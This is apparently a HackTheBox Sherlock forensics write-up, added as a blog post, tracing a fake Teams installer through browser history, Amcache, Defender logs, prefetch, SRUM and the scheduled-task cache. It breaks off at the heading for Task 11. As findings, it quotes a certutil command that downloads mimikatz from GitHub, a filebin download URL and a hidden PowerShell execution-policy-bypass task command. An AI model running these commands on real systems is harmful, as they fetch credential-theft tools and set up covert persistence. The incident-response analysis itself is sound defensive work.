@@ -1,0 +1,201 @@
+---
+title: 'HackTheBox - SillyEli Writeup'
+description: 'My writeups for SillyEli [Hard] Sherlock Challenge'
+date: 2026-01-21
+tags: ['HackTheBox']
+image: './banner.png'
+authors: ['enscribe']
+---
+
+import Callout from '@/components/Callout.astro'
+import { Icon } from 'astro-icon/components'
+
+## Sherlock Scenario
+
+Eli, a recent addition to the IT team, is eager to settle into his new role. Due to the company's flexible "Bring Your Own Device" (BYOD) policy, which applies to everyone except IT administrators, Eli receives a newly prepared PC from Metushelah, the senior IT administrator, as part of the IT team's secure device protocol. Eli's first priority is to install essential applications that will enable him to connect seamlessly with the rest of the team. He begins setting up the system and downloading the necessary software. After a few days on the job, Eli starts noticing something unusual: every so often, a PowerShell window flashes on his screen, disappearing almost instantly, too quickly to read any of its contents. Assuming it's just a minor glitch, Eli continues with his work. However, as the unexpected PowerShell pop-ups persist, Eli decides to consult Metushelah. Metushelah suspects these PowerShell flashes could indicate malicious activity. To ensure there are no security breaches, he conducts a forensic acquisition of Eli's PC and forwards it to the Incident Response team for further analysis. Now, as a member of the IR team, your mission is to investigate Eli's workstation.
+
+## Analysis Process
+
+HackTheBox provided me with the victim's **C drive directory**, and I will use FTK Imager to analyze it. Okay, let's go.
+
+### Task 1: Identify the specific time the malware was downloaded in UTC.
+
+Okay, first we need to find the time the malware was downloaded. In SillyEli's user folder, we can see that they downloaded a lot of things.
+
+<div class="mx-auto">![Old TOC implementation](assets/task1-1.png)</div>
+
+This information alone is not enough to conclude what constitutes malware. I tried checking all of the victim's browsing history, including Chrome and Edge, but got no results. Finally, I switched to checking their Firefox browser history.
+
+```shell
+C/Users/Eli/AppData/Roaming/Mozilla/Firefox/Profiles/sq1wae60.default-release/
+```
+
+I discovered that the victim had downloaded something from a suspicious link.
+
+```shell
+$ sqlite3 places.sqlite
+
+sqlite> .tables
+moz_anno_attributes                 moz_keywords
+moz_annos                           moz_meta
+moz_bookmarks                       moz_origins
+moz_bookmarks_deleted               moz_places
+moz_historyvisits                   moz_places_extra
+moz_historyvisits_extra             moz_places_metadata
+moz_inputhistory                    moz_places_metadata_search_queries
+moz_items_annos                     moz_previews_tombstones
+sqlite> SELECT url, last_visit_date from moz_places;
+...
+https://filesuneedtodownload.s3.eu-north-1.amazonaws.com/TeamsSetup.exe | 1730858274115000
+...
+sqlite>
+```
+
+Converting `1730858274115000` to UTC gives us the result `2024-11-06 01:57:54`.
+
+### Task 2: Which domain name was the file downloaded from?
+
+As we analyzed in the first sentence, the answer will be `filesuneedtodownload.s3.eu-north-1.amazonaws.com`.
+
+### Task 3: Identify the SHA-1 hash of the malware.
+
+What we need is the file's hash. However, this file is no longer on drive C. We will use the `Amcache.hve` file to find it.
+
+<div class="mx-auto">![Old TOC implementation](assets/task3-1.png)</div>
+
+<Callout title="What is Amcache.hve files?" variant="note">
+  **AmCache** is a Windows registry hive used to record information about
+  programs that have previously appeared or been run on a computer.
+</Callout>
+
+Therefore, the final answer is `de733beed85f39605fcdea42dddee190506424f2`. And you can learn more about the `Amcache.hve` file [here](https://securelist.com/amcache-forensic-artifact/117622/).
+
+### Task 4: It looks like malicious tool attempts to download a secondary tool during execution — find and provide the full URL.
+
+I analyzed all the event log files, but I didn't get anything. I finally found something interesting in the Windows Defender Logs at `C\ProgramData\Microsoft\Windows Defender\Support`.
+
+<div class="mx-auto">![Old TOC implementation](assets/task4-1.png)</div>
+
+The malware executed the following command:
+
+```shell
+$ C:\Windows\System32\certutil.exe -urlcache -split -f https://github.com/gentilkiwi/mimikatz/archive/refs/heads/master.zip C:\Users\Eli\Documents\Mimikatz.zip
+```
+
+It uses **certutil** to download the **mimikatz** ZIP file from GitHub to the computer, saving it to `C:\Users\Eli\Documents\Mimikatz.zip`.
+
+<Callout
+  title="What is certutil? And why is it being exploited?"
+  variant="note"
+>
+  Its "standard" purpose is to work with digital certificates and perform
+  certain encryption/authentication-related operations. Additionally, it can
+  also download files from the internet (this is its most common misuse).
+</Callout>
+
+You can learn more about the Windows Defender Logs at
+[here](https://www.thedfirspot.com/post/windows-defender-mp-logs-a-story-of-artifacts).
+
+### Task 5: What is the name of the batch file created on the system as part of the malware execution?
+
+After a thorough search of drive C, I couldn't find any leftover `.bat` files in the system. So I decided to analyze the prefetch files to find some clues.
+
+First, use `PECmd` to parse these files into CSV format:
+
+```shell
+$ PECmd.exe -d "D:\sharedVB\mnt\SillyEli\Acquisition\C\Windows\prefetch" --csv "D:\sharedVB\mnt\out" --csvf foo.csv
+```
+
+Next, I checked for any `.bat` files and found one with a rather suspicious name: `TEAMSUPDATER.BAT`
+
+<div class="mx-auto">![Old TOC implementation](assets/task5-1.png)</div>
+
+From the analysis results, we can draw the following conclusions:
+
+- **CMD.exe** ran 12 times.
+- There were runs at the exact "incident times": `11/06/2024 01:56`, `01:58`, `02:34`.
+- During those runs, `cmd.exe` accessed `TeamsUpdater.bat`.
+
+### Task 6: What was the runtime duration of the malware? (Duration in Ms)
+
+To find the runtime duration of malware, we need to use the `SRUDB.dat` file.
+
+<Callout title="What is the SRUDB.dat file?" variant="note">
+  **SRUDB.dat** is the database of the **Windows System Resource Usage Monitor (SRUM)**.
+  Windows uses it to record the history of resource usage and application
+  activity over time.
+
+You can read more about it [here](https://www.magnetforensics.com/blog/srum-forensic-analysis-of-windows-system-resource-utilization-monitor/).
+
+</Callout>
+
+First, use `SrumECmd` to parse these files into CSV format:
+
+```shell
+$ SrumECmd.exe -f "D:\sharedVB\mnt\SillyEli\Acquisition\C\Windows\System32\SRU\SRUDB.dat" --csv "D:\sharedVB\mnt"
+```
+
+By filtering with the filename `TeamsSetup.exe`, we can runtime duration of malware:
+
+<div class="mx-auto">![Old TOC implementation](assets/task6-1.png)</div>
+
+### Task 7: Locate the local URL cache and identify the full URL the threat actor used to download an additional tool during the attack. Include the complete URL with filename and extension.
+
+While searching for information to answer this question, I found a pretty good blog [here](https://www.cybertriage.com/blog/dfir-breakdown-using-certutil-to-download-attack-tools/). As we know, the attacker exploited **certutil** to download malware and with parameter `-urlcache`, downloaded files typically retain the last part of the URL as their name.
+
+```shell
+$ C:\Windows\System32\certutil.exe -urlcache -split -f https://github.com/gentilkiwi/mimikatz/archive/refs/heads/master.zip C:\Users\Eli\Documents\Mimikatz.zip
+```
+
+By using this parameter, these artifacts exist at the following locations:
+
+- **Content**: Contains copies of any file downloaded by **certutil**.
+
+```shell
+  C:/Users/_/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/_ (standard user folder)
+  C:/Windows/_/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/_ (System user folder)
+```
+
+- **MetaData**: Contains a file with information about the download, such the URL and date.
+
+```shell
+  C:/Users/_/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/_ (standard user folder)
+  C:/Windows/_/config/systemprofile/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/_ (System user folder)
+```
+
+Since files in **CryptnetUrlCache** are unreadable by default, we will use a [tool](https://github.com/AbdulRhmanAlfaifi/CryptnetURLCacheParser) to parse them.
+
+```shell
+$ python3 CryptnetURLCacheParser/CryptnetUrlCacheParser.py -d "/home/viettin/Desktop/MetaData"
+...
+"2024-11-06T02:13:49.965020","2023-11-13T19:45:56","https://filebin.net/archive/0rkhisv2iq4slveo/kape.zip",139551589,"zipff5183968015c93jd847cf91cf071373","/home/viettin/Desktop/MetaData/5714CB78C8B535362BEA612E6F6795A4"
+...
+```
+
+So the answer is `https://filebin.net/archive/0rkhisv2iq4slveo/kape.zip`.
+
+### Task 8: What is the name of the scheduled task that the attacker created for persistence?
+
+We can find scheduled tasks in the **TaskCache**. This is the Task Scheduler cache in the Registry. Here we see a scheduled task set for `01:58` - corresponding to the time when the malware was downloaded.
+
+<div class="mx-auto">![Old TOC implementation](assets/task8-1.png)</div>
+
+So the answer is `TeamsUpdater`.
+
+### Task 9: What is the unique GUID associated with the malicious scheduled task?
+
+As analyzed in the question above, the final answer is `{A4F7ED3E-E7CD-4539-8E79-D73B568FC298}`.
+
+### Task 10: Identify the process or command executed by the malicious scheduled task.
+
+In the Tasks subkey, go to the GUID associated with the malicious scheduled task and look at the **Actions** tab.
+
+<div class="mx-auto">![Old TOC implementation](assets/task10-1.png)</div>
+
+After decoding, we will obtain the following payload:
+
+```powershell
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Eli\AppData\Local\Temp\Teams.ps1
+```
+
+### Task 11: Identify the attacker's IP address and port.
